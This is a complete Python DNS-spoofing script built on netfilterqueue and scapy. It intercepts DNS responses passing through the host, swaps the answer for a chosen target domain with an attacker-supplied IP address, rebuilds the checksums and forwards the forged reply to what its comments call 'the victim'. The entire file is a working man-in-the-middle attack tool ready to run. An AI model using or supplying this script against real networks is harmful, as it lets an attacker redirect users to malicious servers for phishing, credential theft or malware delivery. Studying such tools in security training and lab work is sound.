#! /usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", dest="domain", help="Specify a domain to spoof")
    parser.add_argument("-r", "--ip", dest="ip", help="Specify IP address to redirect to")
    values = parser.parse_args()
    if not values.domain:
        parser.error("[-] Please specify a domain to spoof, use --help for more information")
    if not values.ip:
        parser.error("[-] Please specify IP address to redirect to, use --help for more information")
    return values


def forge_packet(scapy_packet):
    options = get_args()
    # Get the DNS Query name from the scapy packet.
    # Query name is the host name sent by the victim to the DNS server.
    qname = scapy_packet[scapy.DNSQR].qname
    # If the query name is our target domain,
    # modify the DNS sent IP address with IP address in arguments.
    if options.domain+'.' == qname.decode():
        print("[+] Spoofing Target")
        answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
        scapy_packet[scapy.DNS].an = answer
        # Modify the packet ancount with 1,
        # Send a single DNSRR to the victim.
        scapy_packet[scapy.DNS].ancount = 1
        # Packet corruption can be detected using the checksum and
        # len fields. By deleting these scapy generates new entries.
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len
    return scapy_packet


def process_packet(packet):
    # Convert the NetfilterQueue packet into a scapy packet.
    scapy_packet = scapy.IP(packet.get_payload())
    # If the scapy packet has the DNS Resource Record(DNSRR),
    # modify the packet, otherwise no changes will be made.
    if scapy_packet.haslayer(scapy.DNSRR):
        forged_packet = forge_packet(scapy_packet)
        # Set the forged scapy packet payload to the
        # NetfilterQueue packet.
        packet.set_payload(bytes(forged_packet))
    # Forward to the victim.
    packet.accept()


# Create netfilterqueue instance
queue = netfilterqueue.NetfilterQueue()
# Bind queue number 0 (queue zero in iptables)
queue.bind(0, process_packet)
# Run the queue
queue.run()
